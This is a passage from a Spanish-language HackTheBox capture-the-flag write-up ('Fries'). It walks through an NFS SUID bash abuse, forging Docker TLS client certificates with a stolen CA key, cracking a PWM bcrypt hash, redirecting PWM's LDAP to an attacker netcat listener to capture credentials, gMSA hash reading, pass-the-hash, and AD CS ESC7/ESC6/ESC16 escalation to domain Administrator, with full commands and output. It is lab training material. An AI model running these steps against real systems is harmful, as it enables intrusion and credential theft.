-rw-r-----  1 root  59605603  1111 Dec 22  2025 ca.pem
-rw-r-----  1 root  59605603  1115 Dec 22  2025 server-cert.pem
-rw-r-----  1 root  59605603  1704 Dec 22  2025 server-key.pem
-rw-r-----  1 root  59605603   205 Dec 22  2025 server-openssl.cnf
-rw-r-----  1 root  59605603   940 Dec 22  2025 server.csr
```

Copiaremos los archivos del directorio `certs` en una carpeta local para evitar perderlos cuando nos desconectemos

``` bash
barman:attacker-machine:~$ mkdir /tmp/certs
barman:attacker-machine:~$ cp /tmp/nfs/certs/* /tmp/certs
```

### Alternative Attack Vector 

También podríamos haber subido el binario `bash`, haberle otorgado permisos `SUID/SGID` asignando el `sticky bit`, y posteriormente ejecutándolo desde la máquina víctima

``` bash
barman:attacker-machine:~$ cp /bin/bash /tmp/fakebash # Copia de bash
barman:attacker-machine:~$ chown barman:59605603 /tmp/fakebash # Asignar permisos
barman:attacker-machine:~$ cp /tmp/fakebash /tmp/nfs/shared # Copiamos al directorio NFS
barman:attacker-machine:~$ chmod +s /tmp/nfs/fakebash # o chmod 2755 (SGID)

svc@web:/srv/web.fries.htb$ ls shared/ -la
total 1372
drwxrwxrwx 2 root   root              4096 Dec 22 05:45 .
drw-r-xr-x 5    655 root              4096 May 28  2025 ..
-rwsr-sr-x 1 barman infra managers 1396520 Dec 22 05:45 fakebash
```

Al momento de ejecutar esta copia de `bash` maliciosa, vemos que hemos suplantado a un usuario del sistema y al grupo `infra managers`

``` bash
svc@web:/srv/web.fries.htb$ ./shared/fakebash -p
fakebash-5.1$ id
uid=1000(svc) gid=1000(svc) euid=117(barman) egid=59605603(infra managers)

fakebash-5.1$ ls certs -la
total 32
drwxrwx--- 2 root infra managers 4096 May 26  2025 .
drw-r-xr-x 5  655 root           4096 May 28  2025 ..
-rw-r----- 1 root infra managers 1708 Dec 22 05:50 ca-key.pem
-rw-r----- 1 root infra managers 1111 Dec 22 05:50 ca.pem
-rw-r----- 1 root infra managers 1115 Dec 22 05:50 server-cert.pem
-rw-r----- 1 root infra managers  940 Dec 22 05:50 server.csr
-rw-r----- 1 root infra managers 1704 Dec 22 05:50 server-key.pem
-rw-r----- 1 root infra managers  205 Dec 22 05:50 server-openssl.cnf
```


## Abusing Docker over TLS

Ahora disponemos de un conjunto de archivos que componen un servicio de clave pública (`PKI`), donde tenemos los archivos de la `CA` necesarios para generar nuevos certificados, además de la configuración de `openssl` y un certificado de ejemplo ya generado.

Al inspeccionar un certificado, como el de la autoridad certificadora (`CA`), notaremos que pertenece al servicio de `docker`

``` bash
openssl x509 -in ca.pem -text -noout | head 
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            4a:57:2a:3a:aa:24:dc:74:0c:f7:0a:03:9f:52:f3:56:67:30:5c:b5
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=DockerCA
        Validity
            Not Before: May 26 17:10:58 2025 GMT
            Not After : May 26 17:10:58 2026 GMT
```

Estos certificados nos pueden llevar a pensar en la idea de [`Docker Over TLS`](https://docs.docker.com/engine/security/protect-access/#use-tls-https-to-protect-the-docker-daemon-socket) consiste en la comunicación segura y encriptada hacia la API de `docker`, el puerto que se utiliza para la comunicación segura es el `2376`

``` bash
svc@web:~$ ss -tunl | grep 2376
tcp   LISTEN 0      4096       127.0.0.1:2376       0.0.0.0:*
```

### `authz` - Docker Authorization Plugin

Al intentar usar los certificados con el binario de `docker` a través de [TLS](https://notes.kodekloud.com/docs/Certified-Kubernetes-Security-Specialist-CKS/Cluster-Setup-and-Hardening/Docker-Securing-the-Daemon#enabling-certificate-based-authentication), obtendremos el siguiente error de permisos

``` bash
docker --tlsverify --tlscacert ca.pem --tlscert server-cert.pem --tlskey server-key.pem -H=tcp://127.0.0.1:2376 ps
  
Error response from daemon: authorization denied by plugin authz-broker: no policy applied (user: 'fries' action: 'container_list')
```

El error se debe a un fallo en la autorización gestionada por el plugin [`authz-broker`](https://github.com/twistlock/authz).

Las políticas de autorización residen bajo el archivo `/var/lib/authz-broker/policy.json`, al leer este archivo dentro de la máquina, veremos las entradas 

``` bash
svc@web:~$ cat /var/lib/authz-broker/policy.json
 
{"name":"policy_1", "users": ["svc"], "actions": ["container_list", "container_logs"]}
{"name":"policy_1", "users": ["sysadm"], "actions": ["container"], "readonly":true}
{"name":"policy_2", "users": ["root"], "actions": [""]}
```

### `X.509` Certificate Issuing

Podemos definir la configuración, donde en el campo de `Distingished Name` especificaremos al usuario para el que solicitaremos un nuevo certificado. En este caso basta con `sysadm`, aunque también podemos solicitar certificados para el usuario `root`

``` bash
svc@web:/tmp/certs$ cat openssl.cnf 
[ req ]
distinguished_name = req_distinguished_name
prompt = no

[ req_distinguished_name ]
CN = sysadm
```

Generaremos una nueva clave privada con `openssl`

``` bash
openssl genrsa -out sysadm-key.pem 2048
```

Ahora crearemos una solicitud de firma (`.csr`) usando la clave privada que creamos y la configuración definida

``` bash
openssl req -new -key sysadm-key.pem -out sysadm.csr -config openssl.cnf
```

Ahora nos queda firmar la solicitud de certificado y generar un archivo `.pem` usando la clave pública y privada raíz (archivos `.pem` de la `CA`)

``` bash
openssl x509 -req -in sysadm.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out sysadm-cert.pem -days 365 -extfile <(echo "extendedKeyUsage=clientAuth")

Certificate request self-signature ok
subject=CN = sysadm
```

### SSH Local Port Forwarding

Para poder enumerar `docker` desde nuestra máquina, podemos reenviar el puerto `2376` para alcanzarlo en `localhost`

``` bash
ssh svc@fries.htb -L 2376:127.0.0.1:2376 -fN
```

- `-fN`: Ejecutar el proceso en segundo plano sin abrir una nueva shell

Ahora que disponemos de un certificado para un usuario que debiera tener permisos de `container`, utilizando el nuevo certificado volveremos a intentar listar los contenedores en la API remota de `docker` usando TLS

``` bash
docker --tlsverify --tlscacert ca.pem --tlscert sysadm-cert.pem --tlskey sysadm-key.pem -H=tcp://127.0.0.1:2376 ps -a

CONTAINER ID   IMAGE                   COMMAND                  CREATED        STATUS       PORTS                                                                        NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   "/app/startup.sh"        5 months ago   Up 6 hours   0.0.0.0:8443->8443/tcp, [::]:8443->8443/tcp                                  pwm
cb46692a4590   dpage/pgadmin4:9.1.0    "/entrypoint.sh"         6 months ago   Up 6 hours   443/tcp, 127.0.0.1:5050->80/tcp                                              pgadmin4
bfe752a26695   fries-web               "/usr/local/bin/pyth…"   6 months ago   Up 6 hours   127.0.0.1:5000->5000/tcp                                                     web
858fdf51af59   postgres:16             "docker-entrypoint.s…"   6 months ago   Up 6 hours   5432/tcp                                                                     postgres
b916aad508e2   gitea/gitea:1.22.6      "/usr/bin/entrypoint…"   6 months ago   Up 6 hours   127.0.0.1:3000->3000/tcp, 172.18.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
```

> Si obtienes el error `Error response from daemon: client version 1.52 is too new. Maximum supported API version is 1.50`, usa el siguiente comando para hacer `"downgrade"` a la versión de la API que necesitas.
{: .notice--danger}

``` bash
export DOCKER_API_VERSION=1.50
```


## PWM Access

En este caso nos interesa acceder al servicio `pwm`, el cual es el único al que nos falta acceder. Haremos uso del comando `logs` para ver la información del comportamiento de este contenedor

``` bash
docker --tlsverify --tlscacert ca.pem --tlscert sysadm-cert.pem --tlskey sysadm-key.pem -H=tcp://127.0.0.1:2376 logs f427ecaa3bdd 2>&1 | head -n 10

file /app/java.vmoptions exists, adding to java options
file /config/java.vmoptions does not exist.
effective java options: -server -Xmx1g -Xms1g -Xlog:gc:file=/config/logs/gc.log:time,uptime,level,tags:filecount=10,filesize=10M 
starting java
2025-06-01T20:47:38Z, OneJar, using work directory: /root/.pwm-workpath/work-pwm-8443
2025-06-01T20:47:38Z, OneJar, purging work directory: /root/.pwm-workpath/work-pwm-8443
2025-06-01T20:47:42Z, OneJar, deployed war
2025-06-01T20:47:44.765379Z, DEBUG, stored.ConfigurationReader, loading configuration file: /config/PwmConfiguration.xml
2025-06-01T20:47:47.531355100Z, DEBUG, stored.ConfigurationReader, configuration reading/parsing of 134,122 bytes complete (2741ms)
2025-06-01T20:47:47.533082800Z, DEBUG, stored.ConfigurationReader, configuration mode: CONFIGURATION
```

### Config File

Con el comando `cp` copiaremos el archivo `PwmConfiguration.xml` en nuestro directorio local

``` bash
docker --tlsverify --tlscacert ca.pem --tlscert sysadm-cert.pem --tlskey sysadm-key.pem -H=tcp://127.0.0.1:2376 cp f427ecaa3bdd:/config/PwmConfiguration.xml .
```

Al inspeccionar el archivo de configuración, veremos un hash, el cual corresponde a la contraseña de configuración del servicio `pwm`

``` bash
cat PwmConfiguration.xml | head -n 30

<?xml version="1.0" encoding="UTF-8"?><PwmConfiguration createTime="2025-06-01T02:07:43Z" modifyTime="2025-06-01T19:53:04Z" pwmBuild="b7ed22b" pwmVersion="2.0.8" xmlVersion="5">
    <!--
		This configuration file has been auto-generated by the PWM password self service application.

		WARNING: This configuration file contains sensitive security information, please handle with care!

		WARNING: If a server is currently running using this configuration file, it will be restarted and the
	        configuration updated immediately when it is modified.

		NOTICE: This file is encoded as UTF-8.  Do not save or edit this file with an editor that does not
		       support UTF-8 encoding.

		If unable to edit using the application ConfigurationEditor web UI, the following options are available:
		     1. Edit this file directly by hand.
		     2. Remove restrictions of the configuration by setting the property "configIsEditable" to "true".
		        This will allow access to the ConfigurationEditor web UI without having to authenticate to an
		        LDAP server first.

		If you wish for sensitive values in this configuration file to be stored unencrypted, set the property
		"storePlaintextValues" to "true".
-->
    <properties type="config">
        <property key="configIsEditable">true</property>
        <property key="configEpoch">0</property>
        <property key="configPasswordHash">$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG</property>
    </properties>
    <settings>
        <setting key="notes.noteText" syntax="TEXT_AREA" syntaxVersion="0">
            <label>Configuration Notes ⇨ Configuration Notes</label>
            <default/>
```

### Hash Cracking

Guardaremos este hash en un archivo para intentar descifrarlo con herramienta como `john` o `hashcat`

``` bash
echo '$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG' > hash.txt
john --wordlist=/usr/local/share/wordlists/rockyou.txt hash.txt                        
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
rockon!          (?)
1g 0:00:00:13 DONE (2025-11-25 00:30) 0.07593g/s 1688p/s 1688c/s 1688C/s rockon!..retrospect
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Web Access - `Configuration Manager`

Navegaremos nuevamente hasta `https://pwm.fries.htb` para intentar conectarnos a `pwm` utilizando la contraseña que desciframos (desde el botón `Configuration Manager`)

![image-center](/assets/images/posts/fries-14-hackthebox.png)
{: .align-center}


## Stealing LDAP Credentials - PWM Config File Manipulation

Al entrar a la plataforma `PWM`, veremos el mensaje que vimos en principio, donde se notifica al usuario que no es posible conectarse al servidor `LDAP`

![image-center](/assets/images/posts/fries-15-hackthebox.png)
{: .align-center}

### Modifying `PwmConfiguration.xml`

En este punto modificaremos y el archivo `PwmConfiguration.xml` para que en vez de intentar conectarse al servidor `LDAP` del Domain Controller, se conecte a un servidor montado por nosotros, y de esta forma podamos capturar las credenciales.

Abriremos el archivo con un editor de texto para modificar la línea `92` del archivo `PwmConfiguration.xml`

``` xml
...
<SNIP>
...
        </setting>
        <setting key="ldap.serverUrls" modifyTime="2025-06-01T19:53:04Z" profile="default" syntax="STRING_ARRAY" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs</label>
            <value>ldap://10.10.16.203:389</value>
        </setting>
        <setting key="ldap.profile.displayName" profile="default" syntax="LOCALIZED_STRING" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Login Setup ⇨ LDAP Profile Display Name</label>
            <default/>
        </setting>
...
<SNIP>
...
```

Iniciaremos un listener que escuche por el puerto `389`, esto es necesario debido a que `LDAP` usa el puerto `389` mientras que `LDAPS` usa el puerto `636`. 

> Al intentar usar el protocolo `LDAPS` no podremos ver las credenciales en texto claro, debido a que los datos viajan cifrados.
{: .notice--info}

``` bash
nc -lvnp 389
```

Subiremos el nuevo archivo de configuración con la opción `Import Configuration`

![image-center](/assets/images/posts/fries-16-hackthebox.png)
{: .align-center}

Al subir el nuevo archivo, el servicio `PWM` se reiniciará. Al ocurrir esto, veremos la autenticación hacia nuestro listener, donde el usuario `svc_infra` se intenta autenticar con sus credenciales

> Al finalizar la conexión, es posible que se recibamos los caracteres `0P` al final, lo que nos puede confundir al leer la contraseña
{: .notice--danger}

``` bash
Connection from 10.10.11.96:49822
0A`<\%CN=svc_infra,CN=Users,DC=fries,DC=htb�m6tneOMAh5p0wQ0d
```

Podemos intentar validar estas credenciales con `netexec` en el dominio

``` bash
nxc ldap DC01.fries.htb -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d'
LDAP        10.10.11.96   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.96   389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
```


## Domain Enumeration - `Bloodhound` 

Finalmente disponemos de credenciales válidas en el dominio, continuaremos enumerando la información disponible en el Controlador de Domino para analizarla con `Bloodhound`

``` bash
bloodhound-ce-python -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' -ns 10.10.11.96 -c All --use-ldaps

INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: fries.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 19 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: web
INFO: Querying computer: DC01.fries.htb
WARNING: Could not resolve: web: The resolution lifetime expired after 3.102 seconds: Server Do53:10.10.11.96@53 answered The DNS operation timed out.
INFO: Done in 01M 41S
```


## Abusing AD ACL Rights - `ReadGMSAPassword`

La cuenta `svc_infra` posee derechos `ReadGMSAPassword` sobre la cuenta `gmsa_ca_prod$.

Este derecho otorga la capacidad de leer el atributo `msDS-ManagedPassword` de una cuenta `gMSA`, resultando en una lectura del hash NTLM de la cuenta víctima.`

![image-center](/assets/images/posts/fries-17-hackthebox.png)
{: .align-center}

La cuenta `gmsa_ca_prod$` es una cuenta  `gMSA` (`group Managed Service Account`).

> Las cuentas `gMSA` son un tipo de cuenta de dominio de Active Directory que automatiza la gestión de contraseñas para servicios y aplicaciones en uno o varios servidores.
{: .notice--info}

- Este tipo de cuentas son gestionadas directamente por el Controlador de Dominio, quien rota las credenciales de este tipo de cuentas.

La herramienta `netexe` nos permite obtener el hash NTLM de la cuenta `gmsa` rápidamente usando la siguiente sintaxis

> Al ser una cuenta `gMSA`, es posible que el hash NTLM que obtengamos sean diferentes debido a la rotación de credenciales.
{: .notice--warning}

``` bash
nxc ldap DC01.fries.htb -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' --gmsa
LDAP        10.10.11.96   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.96   389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
LDAP        10.10.11.96   389    DC01             [*] Getting GMSA Passwords
LDAP        10.10.11.96   389    DC01             Account: gMSA_CA_prod$        NTLM: fc20b3d3ec179c5339ca59fbefc18f4a     PrincipalsAllowedToReadPassword: svc_infra
```


## Shell as `gmsa_ca_prod$`

Esta cuenta es miembro del grupo `Remote Management Users`, esto le permite conectarse al Controlador de Dominio con una consola de `powershell`

![image-center](/assets/images/posts/fries-18-hackthebox.png)
{: .align-center}

Nos conectaremos al DC como la cuenta `gmsa_ca_prod$` haciendo PassTheHash

``` bash
evil-winrm-py -i DC01.fries.htb -u 'gMSA_CA_prod$' -H 'fc20b3d3ec179c5339ca59fbefc18f4a'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'DC01.fries.htb:5985' as 'gMSA_CA_prod$'
evil-winrm-py PS C:\Users\gMSA_CA_prod$\Documents> whoami
fries\gmsa_ca_prod$
```
<br>


# Escalada de Privilegios
---
## Abusing AD CS - From `ESC7` to `ESC6` + `ESC16` Technique

La técnica `ESC7` aborda las vulnerabilidades que surgen cuando un atacante obtiene permisos con privilegios sobre una autoridad certificadora (`CA`) dentro del servicio AD CS (`Active Directory Certificate Services`).

### Understanding Vulnerability

 Cuando obtenemos permisos de configuración de la autoridad certificadora (`CA`), estos otorgan un control sobre las operaciones y la seguridad, con los cuales podemos:

- Administrar `CA` (`CA Administrator/ManageCa`): Control amplio sobre la autoridad certificadora, como modificar la configuración de plantillas, asignar funciones de `CA`, iniciar/detener el servicio y administrar la seguridad de la `CA`.

- Administrar certificados (`Certificate Manager/Officer`): Permite al usuario aprobar o denegar solicitudes de certificados pendientes y revocar certificados emitidos.

Aunque la función de administrar certificados podría permitir una escalada de privilegios sin una solicitud pendiente de un certificado privilegiado, obtener derechos de "Administrar `CA`" es extremadamente peligroso.

Con estos permisos podríamos asignarnos funciones de `CA` necesarias o manipular la configuración de la `CA` para facilitar la emisión de certificados, lo que significaría comprometer todo un dominio.

### Templates Enumeration

Usaremos el comando `find` para enumerar los permisos en la `CA` disponible

``` bash
certipy find -u 'gmsa_ca_prod$' -hashes :fc20b3d3ec179c5339ca59fbefc18f4a -target DC01.fries.htb
       
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.fries.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 10 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fries-DC01-CA
    DNS Name                            : DC01.fries.htb
    Certificate Subject                 : CN=fries-DC01-CA, DC=fries, DC=htb
    Certificate Serial Number           : 26117C1FFA5705AF443B7E82E8C639A9
    Certificate Validity Start          : 2025-11-18 05:39:18+00:00
    Certificate Validity End            : 3024-05-19 14:11:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : FRIES.HTB\Administrators
      Access Rights
        ManageCa                        : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        ManageCertificates              : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        Enroll                          : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Domain Computers
                                          FRIES.HTB\Authenticated Users
    [+] User Enrollable Principals      : FRIES.HTB\Domain Users
                                          FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Authenticated Users
                                          FRIES.HTB\Domain Computers
    [+] User ACL Principals             : FRIES.HTB\gMSA_CA_prod
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
...
<SNIP>
...
```

### Expose to `ESC6`

Como tenemos permisos de administración sobre la `CA`, podemos habilitar configuración vulnerable para derivar el ataque al uso de otra técnica, como es el caso de `ESC6`.

La técnica `ESC6` se centra en la configuración de la `CA`, concretamente en la flag `EDITF_ATTRIBUTESUBJECTALTNAME2`. 

Cuando e asigna esta configuración, permite solicitar certificados que incluyan un nombres alternativos de sujeto (`SAN`) especificando el atributo especial (`san:<tipo>=<valor>`, por ejemplo, `san:upn=administrator@corp.local&sid=S-1-X-...`).

`Certify.exe` permite automatizar la configuración en la `CA` para permitir `ESC6`

``` powershell
evil-winrm-py PS C:\Programdata> .\Certify.exe manage-ca --ca DC01.FRIES.HTB\fries-DC01-CA --esc6

   _____          _   _  __          
  / ____|        | | (_)/ _|         
 | |     ___ _ __| |_ _| |_ _   _    
 | |    / _ \ '__| __| |  _| | | |   
 | |___|  __/ |  | |_| | | | |_| |   
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |   
                            |___./   
  v2.0.0                         

[*] Action: Manage a certificate authority

[*] Attempting to toggle EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on the CA.
[*] The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is not set, toggling it on.
[*] Successfully set the EditFlags configuration on the CA.

[*] Attempting to restart the CA service.
[*] Successfully stopped the CA service.
[*] Successfully restarted the CA service.

Certify completed in 00:00:00.5836376
```

Con el comando `certutil` podemos consultar las flags, el objetivo es ver `EDITF_ATTRIBUTESUBJECTALTNAME2` bajo la clave de registro `EditFlags`

``` powershell
evil-winrm-py PS C:\Programdata> certutil.exe -config "DC01.FRIES.HTB\fries-DC01-CA" -getreg "policy\EditFlags"
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags:

  EditFlags REG_DWORD = 15014e (1376590)
    EDITF_REQUESTEXTENSIONLIST -- 2
    EDITF_DISABLEEXTENSIONLIST -- 4
    EDITF_ADDOLDKEYUSAGE -- 8
    EDITF_BASICCONSTRAINTSCRITICAL -- 40 (64)
    EDITF_ENABLEAKIKEYID -- 100 (256)
    EDITF_ENABLEDEFAULTSMIME -- 10000 (65536)
    EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
    EDITF_ENABLECHASECLIENTDC -- 100000 (1048576)
CertUtil: -getreg command completed successfully.
```

Cuando intentamos solicitar un certificado posterior a la configuración que permite `ESC6`, vemos que el `SAN` es correctamente añadido. Sin embargo el certificado agrega `Security Extension`, el cual dificulta una posterior autenticación para `Administrator`

``` bash
certipy req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -target DC01.fries.htb -dc-ip 10.10.11.69 -template User -ca fries-DC01-CA -upn 'administrator@fries.htb' -sid S-1-5-21-858338346-3861030516-3975240472-500

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.401 seconds: Server Do53:10.10.11.69@53 answered The DNS operation timed out.; Server Do53:10.10.11.69@53 answered The DNS operation timed out.; Server Do53:10.10.11.69@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 43
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[!] Conflicting SIDs found in certificate:
[!]     SAN URL:            'S-1-5-21-858338346-3861030516-3975240472-500'
[!]     Security Extension: 'S-1-5-21-858338346-3861030516-3975240472-3601'
[!] Windows will use the security extension SID for authentication purposes
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-3601'
[*] Saving certificate and private key to 'administrator.pfx'
```

### Enable `ESC16`

Como podemos configurar la `CA`, es posible habilitar `ESC16`, con el objetivo de eludir la extensión de seguridad que se encuentra configurada y que está presente en el certificado que emitimos.

[`ESC16`](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) describe la configuración incorrecta en la que la propia `CA` está configurada globalmente para deshabilitar la la extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`, identificada con el `oid 1.3.6.1.4.1.311.25.2`.

Cuando la `CA` tiene el OID `1.3.6.1.4.1.311.25.2` añadido en la configuración del registro `policy\DisableExtensionList` (bajo `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>`), todos los certificados emitidos por la `CA` carecerán de la extensión de seguridad. Esto hace que las plantillas se comporten como si estuvieran configuradas con la flag `CT_FLAG_NO_SECURITY_EXTENSION`, como se ve en la técnica [`ESC9`](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template).

`Certify.exe` también permite deshabilitar esta configuración de forma automatizada, permitiendo `ESC16`

``` powershell
evil-winrm-py PS C:\Programdata> .\Certify.exe manage-ca --ca DC01.FRIES.HTB\fries-DC01-CA --esc16

   _____          _   _  __          
  / ____|        | | (_)/ _|         
 | |     ___ _ __| |_ _| |_ _   _    
 | |    / _ \ '__| __| |  _| | | |   
 | |___|  __/ |  | |_| | | | |_| |   
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |   
                            |___./   
  v2.0.0                         

[*] Action: Manage a certificate authority

[*] Attempting to toggle szOID_NTDS_CA_SECURITY_EXT in the DisableExtensionList attribute (ESC16) on the CA.
[*] The szOID_NTDS_CA_SECURITY_EXT extension does not exist in DisableExtensionList, adding it.
[*] Successfully set the DisableExtensionList configuration on the CA.

[*] Attempting to restart the CA service.
[*] Successfully stopped the CA service.
[*] Successfully restarted the CA service.

Certify completed in 00:00:00.6027426
```

Para verificar la configuración que hace al DC vulnerable a `ESC16`, podemos consultar el siguiente valor en la clave de registro, donde veremos el respectivo OID `1.3.6.1.4.1.311.25.2`

``` powershell
evil-winrm-py PS C:\Programdata> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy /v DisableExtensionList

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy
    DisableExtensionList    REG_MULTI_SZ    1.3.6.1.4.1.311.25.2
```

### Exploiting

Con la configuración vulnerable preparada, podremos solicitar un certificado en nombre de `Administrator`, el cual ahora no contendrá la extensión de seguridad

``` bash
certipy req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -target DC01.fries.htb -dc-ip 10.10.11.96 -template User -ca fries-DC01-CA -upn 'administrator@fries.htb' -sid S-1-5-21-858338346-3861030516-3975240472-500

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 69
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Utilizaremos este certificado a modo de autenticación, obtendremos el hash NTLM del usuario `Administrator`

~~~ bash
certipy auth -pfx administrator.pfx -domain fries.htb -dc-ip 10.10.11.96

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a77...
~~~


## Root Time

Con el hash NT del usuario `Administrator`, ya podremos conectarnos con privilegios al Controlador de Dominio haciendo `PassTheHash`

``` bash
evil-winrm-py -i DC01.fries.htb -u 'Administrator' -H 'a77...'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'DC01.fries.htb:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
fries\administrator
```

Ya podremos ver la última flag ubicada en el escritorio del usuario `Administrator`

``` bash
evil-winrm-py PS C:\Users\Administrator\Documents> type ../Desktop\root.txt
126...
```

> A really great talent finds its happiness in execution.
> — Johann Wolfgang von Goethe
{: .notice--info}
